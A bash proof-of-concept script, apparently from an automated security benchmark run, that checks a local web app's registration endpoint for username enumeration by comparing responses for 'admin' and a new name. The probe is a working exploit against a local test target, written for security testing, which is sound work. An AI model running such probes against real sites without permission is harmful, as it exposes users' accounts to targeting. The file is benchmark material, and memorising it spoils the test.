#!/bin/bash
# POC: Demonstrates account enumeration via duplicate username detection in the registration endpoint. Shows how the application reveals whether a username already exists by returning specific error messages.
# Target: ./repo
# Created: 2025-11-10T14:43:21.056Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# Account Enumeration POC - Duplicate Username Detection
# This script demonstrates how the registration endpoint reveals valid usernames

TARGET_URL="http://localhost:3000"
REGISTER_ENDPOINT="/register"

echo "=========================================="
echo "Account Enumeration via Username Detection"
echo "=========================================="
echo ""

# Test 1: Attempt to register with an existing username (admin)
echo "[+] Test 1: Attempting registration with existing username 'admin'"
echo "Command: curl -s -X POST $TARGET_URL$REGISTER_ENDPOINT -d 'username=admin&password=test123&first_name=Test&last_name=User&email=test@example.com'"
echo ""

RESPONSE_EXISTING=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d 'username=admin&password=test123&first_name=Test&last_name=User&email=test@example.com')

echo "Response:"
echo "$RESPONSE_EXISTING"
echo ""
echo "---"
echo ""

# Test 2: Attempt to register with a new, unique username
UNIQUE_USERNAME="testuser_$(date +%s)_$$"
echo "[+] Test 2: Attempting registration with new unique username '$UNIQUE_USERNAME'"
echo "Command: curl -s -X POST $TARGET_URL$REGISTER_ENDPOINT -d 'username=$UNIQUE_USERNAME&password=test123&first_name=Test&last_name=User&email=unique@example.com'"
echo ""

RESPONSE_NEW=$(curl -s -X POST "$TARGET_URL$REGISTER_ENDPOINT" \
  -d "username=$UNIQUE_USERNAME&password=test123&first_name=Test&last_name=User&email=unique@example.com")

echo "Response:"
echo "$RESPONSE_NEW"
echo ""
echo "---"
echo ""

# Analysis
echo "[*] ANALYSIS:"
echo ""

# Check for "Username already exists" message
if echo "$RESPONSE_EXISTING" | grep -q "Username already exists"; then
    echo "✓ Existing username 'admin' returned: 'Username already exists!'"
    VULN_CONFIRMED_1=true
else
    echo "✗ Expected 'Username already exists' message not found"
    VULN_CONFIRMED_1=false
fi

# Check for successful registration indicators in new user response
if echo "$RESPONSE_NEW" | grep -q "login" || echo "$RESPONSE_NEW" | grep -q "successfully"; then
    echo "✓ New username returned successful response (redirect or success message)"
    VULN_CONFIRMED_2=true
else
    echo "✗ New username did not return expected success response"
    VULN_CONFIRMED_2=false
fi

echo ""
echo "=========================================="
if [ "$VULN_CONFIRMED_1" = true ] && [ "$VULN_CONFIRMED_2" = true ]; then
    echo "RESULT: VULNERABILITY CONFIRMED"
    echo "The application reveals whether usernames exist via different responses."
    exit 0
else
    echo "RESULT: Inconclusive - responses differ but vulnerability markers unclear"
    exit 1
fi